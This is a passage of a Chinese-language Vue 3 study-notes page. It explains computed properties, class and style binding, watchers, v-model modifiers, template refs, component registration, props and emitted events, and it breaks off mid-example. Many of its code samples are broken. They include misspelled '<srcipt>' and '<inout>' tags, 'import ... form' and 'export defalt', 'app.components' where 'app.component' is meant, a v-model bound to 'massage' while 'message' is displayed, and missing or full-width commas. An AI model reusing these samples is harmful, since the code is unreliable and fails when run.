class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意到我们可以通过写函数或者方法的方式达到同样的效果。唯一不同就在于效率问题：</p><p>计算属性值会基于其响应式依赖被缓存。而方法调用总是在重渲染发生时再次执行函数。</p><p>所以一下复杂的，不太可能变化的需求写成计算属性会提高效率</p></blockquote><h2 id="绑定"><a href="#绑定" class="headerlink" title="绑定"></a>绑定</h2><h3 id="class绑定"><a href="#class绑定" class="headerlink" title="class绑定"></a>class绑定</h3><p> 数据绑定的一个常见需求场景是操控元素的CSS class列表，因为<code>class</code>是attribute，我们可以和其他attribute一样使用<code>v-bind</code>将它们和动态的字符串绑定。但是，在处理比较复杂的绑定时，通过拼接生成字符串是麻烦而且容易出错的。因此，Vue专门为<code>class</code>的<code>v-bind</code>用法提供了特殊的功能增强。除了字符串之外，表达式的值也可以是对象或数组</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p :class=&quot;&#123;&#x27;active&#x27;:isActive,&#x27;text-danger&#x27;:hasError&#125;&quot;&gt;class样式绑定1&lt;/p&gt;</span><br><span class="line">&lt;p :class=&quot;classObject&quot;&gt;class样式绑定2&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;srcipt&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return&#123;</span><br><span class="line">        isActive:true,</span><br><span class="line">        hasError:true</span><br><span class="line">        classObject:&#123;</span><br><span class="line">            active:true,</span><br><span class="line">            text-danger:true</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/srcipt&gt;</span><br><span class="line"></span><br><span class="line">&lt;style&gt;</span><br><span class="line">    .active&#123;</span><br><span class="line">        color:red;</span><br><span class="line">        font-size:30px;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="Style绑定"><a href="#Style绑定" class="headerlink" title="Style绑定"></a>Style绑定</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;p :style=&quot;&#123;color:activeColor,fontSize:fontSize+&#x27;px&#x27;&#125;&quot;&gt;style绑定&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;srcipt&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return&#123;</span><br><span class="line">            activeColor:&quot;red&quot;,</span><br><span class="line">            fontSize:30</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/srcipt&gt;</span><br></pre></td></tr></table></figure><h2 id="侦听器"><a href="#侦听器" class="headerlink" title="侦听器"></a>侦听器</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt; template&gt;</span><br><span class="line">    &lt;h3&gt;侦听器&lt;/h3&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">    &lt; button @click= &quot; updateHandle&quot; &gt;修改数据&lt;/button&gt;</span><br><span class="line">&lt;/ template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return&#123;</span><br><span class="line">        message :&quot;Hello&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;，</span><br><span class="line">    </span><br><span class="line">    methods:&#123;</span><br><span class="line">        updateHandle( )&#123;</span><br><span class="line">        this. message = &quot;World&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    //侦听器</span><br><span class="line">    watch:&#123;</span><br><span class="line">    // newValue:改变之后的数据</span><br><span class="line">    // oldValue: 改变之前的数据</span><br><span class="line">    //函数名必须与侦听的数据对象保持一直</span><br><span class="line">        message (newValue , oldValue)&#123;</span><br><span class="line">        //数据发生变化，自动执行的函数</span><br><span class="line">            console. log( newValue , oldValue);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="表单输入绑定"><a href="#表单输入绑定" class="headerlink" title="表单输入绑定"></a>表单输入绑定</h2><p>在前端处理表单时，我们常常需要将表单输入框的内容同步给JavaScript中相应的变量。手动连接值绑定和更改事件监听器可能会很麻烦，<code>v-model</code>指令帮我们简化了这一步骤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;h1&gt;表单输入绑定&lt;/h1&gt;</span><br><span class="line">    &lt;form&gt;</span><br><span class="line">&lt;input type = &quot;text&quot; v-model=&quot;massage&quot;&gt;</span><br><span class="line">        &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;   &lt;!--同步拿到表单输入的数据massage，并显示--&gt;</span><br><span class="line">    &lt;/form&gt;    </span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                message:&quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h3><p><code>v-modle</code>也提供了修饰符：<code>lazy</code>、<code>number</code>、<code>trim</code></p><h4 id="lazy"><a href="#lazy" class="headerlink" title="lazy"></a><code>lazy</code></h4><p>默认情况下，<code>v-model</code>会在每次<code>input</code>事件后更新数据，你可以添加<code>lazy</code>修饰符来改为在每次<code>change</code>事件后更新数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;input type = &quot;text&quot; v-model.lazy=&quot;massage&quot;&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123;message&#125;&#125;&lt;/p&gt;   </span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                message:&quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="number"><a href="#number" class="headerlink" title="number"></a><code>number</code></h4><p>指定为数据</p><h4 id="trim"><a href="#trim" class="headerlink" title="trim"></a><code>trim</code></h4><p>去掉空格</p><h2 id="模板引用"><a href="#模板引用" class="headerlink" title="模板引用"></a>模板引用</h2><p>​——获取DOM操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div class = &quot;container&quot;&gt;&#123;&#123; content &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">/**</span><br><span class="line">* 内容改变：&#123;&#123;模板语法&#125;&#125;</span><br><span class="line">* 属性改变：v-bind：指令</span><br><span class="line">* 事件：v-on:click</span><br><span class="line">*/</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">           return&#123;</span><br><span class="line">                content:&quot;内容&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="ref"><a href="#ref" class="headerlink" title="ref"></a><code>ref</code></h4><p>虽然vue的声明性渲染模型为你抽象了大部分对DOM的直接操作，但在某些情况下，我们仍然需要直接访问底层DOM元素。要实现这一点，我们可以使用特殊的<code>ref</code>attribute</p><p>挂载结束后引用都会暴露在<code>this.$refs</code>之上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div ref=&quot;container&quot; class = &quot;container&quot;&gt;&#123;&#123; content &#125;&#125;&lt;/div&gt;</span><br><span class="line">&lt; button @click=&quot;getElementHandle&quot;&gt;获取元素&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;inout type=&quot;text&quot; ref = &quot;username&quot;&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">           return&#123;</span><br><span class="line">                content:&quot;内容&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            getElementHandle()&#123;</span><br><span class="line">                console.log(this.$refs.container); //&lt;div class = &quot;container&quot;&gt;内容&lt;/div&gt;</span><br><span class="line">                this.$refs.container.innerHTML = &#x27;hhh&#x27;;   //直接把content改为了hhh</span><br><span class="line">                console.log(this.$refs.username.value);   //获取用户输入的username</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="组件"><a href="#组件" class="headerlink" title="组件"></a>组件</h2><p>组件最大的优势就是可复用性，当使用构建步骤时，我们一般会将Vue组件定义在一个单独的<code>.vue</code>文件中，这杯叫做单文件组件(简称SFC)</p><h3 id="组件组成结构"><a href="#组件组成结构" class="headerlink" title="组件组成结构"></a>组件组成结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;div&gt;承载标签&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;&#125;   //写js代码</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="组件引用"><a href="#组件引用" class="headerlink" title="组件引用"></a>组件引用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//把自己写的组件挡在MyComponent.vue里面</span><br><span class="line">//然后再app.vue里面引用</span><br><span class="line"></span><br><span class="line">&lt;!--app.vue--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;MyConent /&gt; &lt;!--3.显示组件--&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyComponent from &quot;./components/MyComponent.vue&quot;   &lt;!--1.引入组件--&gt;</span><br><span class="line">    </span><br><span class="line">    export default &#123;</span><br><span class="line">        components:&#123;    &lt;!--2.注入组件--&gt; </span><br><span class="line">            MyComponent</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="组件嵌套关系"><a href="#组件嵌套关系" class="headerlink" title="组件嵌套关系"></a>组件嵌套关系</h3><p>组件允许我们将UI划分为独立的、可重用的部分，并且可以每个部分进行单独的思考。在实际应用中，组件常常被组织成层层嵌套的树状结构</p><p>这和我们嵌套HTML元素的方式类似，Vue实现了自己的组件模型，使我们可以在每个组件内发呢告状自定义内容与逻辑。</p><h4 id="创建组件及引用关系"><a href="#创建组件及引用关系" class="headerlink" title="创建组件及引用关系"></a>创建组件及引用关系</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- src</span><br><span class="line">- pages</span><br><span class="line">-Header.vue</span><br><span class="line">-···</span><br><span class="line">- App.vue</span><br></pre></td></tr></table></figure><h6 id="Header-vue"><a href="#Header-vue" class="headerlink" title="Header.vue"></a>Header.vue</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Header&lt;he&gt;</span><br><span class="line">    //header里面也可以引用其他的组件，实现嵌套</span><br><span class="line">    &lt;Title /&gt;</span><br><span class="line">    &lt;Title /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Title form &quot;./Title.vue&quot;</span><br><span class="line">export defalt &#123;</span><br><span class="line">    components:&#123;</span><br><span class="line">        Title</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">    h3&#123;</span><br><span class="line">        width:100%;</span><br><span class="line">        height:100px;</span><br><span class="line">        border:5px solid #999;</span><br><span class="line">        text-align:center;</span><br><span class="line">        line-height:border-box;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h6 id="App-vue"><a href="#App-vue" class="headerlink" title="App.vue"></a>App.vue</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//app.vue</span><br><span class="line">&lt;template&gt;</span><br><span class="line">&lt;Header /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Header from &quot;./pages/Header.vue&quot;</span><br><span class="line">    export default &#123;</span><br><span class="line">        components:&#123;</span><br><span class="line">            Header</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="组件注册方式"><a href="#组件注册方式" class="headerlink" title="组件注册方式"></a>组件注册方式</h3><p>一个Vue组件在使用前需要先被注册，这样Vue才能在渲染模板时找到其对应的实现。组件注册有两种方式：全局注册和局部注册。</p><h4 id="全局注册"><a href="#全局注册" class="headerlink" title="全局注册"></a>全局注册</h4><p><code>main.js</code>：在main.js中注册组件，然后在任意组件中都可以直接引用了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createApp &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">App</span> <span class="keyword">from</span> <span class="string">&#x27;./App.vue&#x27;</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Header</span> <span class="keyword">from</span> <span class="string">&quot;./pages/Header.vue&quot;</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">createApp</span>(<span class="title class_">App</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//在这中间写组件的注册</span></span><br><span class="line">app.<span class="title function_">components</span>(<span class="string">&quot;Header&quot;</span>,<span class="title class_">Header</span>)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">mount</span>(<span class="string">&#x27;#app&#x27;</span>)</span><br></pre></td></tr></table></figure><p>全局注册看起来很方便，但是存在以下问题：</p><ul><li>全局注册，但并没有使用的组件无法在生产打包时被自动移除(也叫”tree-shaking”)。如果你全局注册了一个组件，即使它并没有被实际使用，它仍然会出现在打包后的JS文件中。</li><li>全局注册在大型项目中使项目的依赖关系变得不那么明确。在父组件中使用子组件时，不太容易定位子组件的实现。和使用过多的全局变量一样，这可能会影响应用长期的可维护性。</li></ul><h4 id="局部注册"><a href="#局部注册" class="headerlink" title="局部注册"></a>局部注册</h4><p>就是之前使用的方式:</p><ul><li>引入组件</li><li>注入组件</li><li>显示组件</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//把自己写的组件挡在MyComponent.vue里面</span><br><span class="line">//然后再app.vue里面引用</span><br><span class="line"></span><br><span class="line">&lt;!--app.vue--&gt;</span><br><span class="line">&lt;template&gt;</span><br><span class="line"></span><br><span class="line">&lt;MyConent /&gt;  &lt;!--3.显示组件--&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import MyComponent from &quot;./components/MyComponent.vue&quot;   &lt;!--1.引入组件--&gt;</span><br><span class="line">    </span><br><span class="line">    export default &#123;</span><br><span class="line">        components:&#123;    &lt;!--2.注入组件--&gt; </span><br><span class="line">            MyComponent</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;style scoped&gt;</span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><h3 id="组件传递数据-props"><a href="#组件传递数据-props" class="headerlink" title="组件传递数据-props"></a>组件传递数据-props</h3><p>组件与组件之间并不是完全独立的，而是有交集的，那就是组件与组件之间是可以传递数据的，传递数据的解决方案就是<code>props</code></p><p>在components里面创建两个组件，分别是<code>Parent.vue</code>和<code>Child.vue</code></p><h4 id="静态数据传递"><a href="#静态数据传递" class="headerlink" title="静态数据传递"></a>静态数据传递</h4><h5 id="Parent-vue"><a href="#Parent-vue" class="headerlink" title="Parent.vue"></a><code>Parent.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Parent&lt;/h3&gt;</span><br><span class="line">&lt;Child title=&quot;Parent数据&quot;/&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import Child from &quot;./Child.vue&quot;      //直接引用</span><br><span class="line">    export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            Child</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="Child-vue"><a href="#Child-vue" class="headerlink" title="Child.vue"></a><code>Child.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Child&lt;/h3&gt;</span><br><span class="line">&lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        props:[&quot;title&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h5 id="App-vue-1"><a href="#App-vue-1" class="headerlink" title="App.vue"></a><code>App.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;Parent /&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import Parent from &quot;./components/Parent.vue&quot;</span><br><span class="line">    export default &#123;</span><br><span class="line">        components:&#123;</span><br><span class="line">            Parent</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="动态数据传递"><a href="#动态数据传递" class="headerlink" title="动态数据传递"></a>动态数据传递</h4><blockquote><p> 修改Parent.vue</p></blockquote><h5 id="Parent-vue-1"><a href="#Parent-vue-1" class="headerlink" title="Parent.vue"></a><code>Parent.vue</code></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;Parent&lt;/h3&gt;</span><br><span class="line">&lt;Child :title=&quot;message&quot;/&gt;   //以v-bind的形式绑定动态数据并传递</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    import Child from &quot;./Child.vue&quot;      //直接引用</span><br><span class="line">    export default &#123;</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">message:&quot;Parent数据！&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        components:&#123;</span><br><span class="line">            Child</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>注意事项：</p><p><code>props</code>传递数据<strong>只能从父级传递到子集</strong>，不能反其道而行。</p></blockquote><ul><li>通过<code>props</code>传递数据，不仅可以传递字符串类型的数据，还可以是其他类型，如：数字，对象，数组等。但实际上任何类型的值都可以作为props的值被传递。</li><li>props数据是只读的</li><li>props提供严格的数据类型的效验</li></ul><h2 id="组件事件"><a href="#组件事件" class="headerlink" title="组件事件"></a>组件事件</h2><p>在组件的模板表达式中。可以直接使用<code>$emit</code>方法触发自定义事件，触发自定义事件的目的是<strong>组件之间传递数据</strong>。</p><p><code>./components/ComponentEvent.vue</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">&lt;h3&gt;组件事件&lt;/h3&gt;</span><br><span class="line">&lt;Child @someEvent = &quot;getHandle&quot; /&gt;    </span><br><span class="line">&lt;p&gt;父级接收了:&#123;&#123; message &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import CHild from &quot;./Child.vue&quot;</span><br><span class="line">    export default &#123;</span><br><span class="line">    components:&#123;</span><br><span class="line">        Child</span><br><span class="line">    &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            getHandle(data)&#123;</span><br><span class="line">                console.log(&quot;触发了 &quot;,data);</span><br><span class="line">                this.message = data;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        data()&#123;</span><br><span class="line">            return &#123;</span><br><span class="line">                message:&quot;&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><code>./components/Child.vue</code>：</p><figure class="highlight plaintext"><table><tr><td 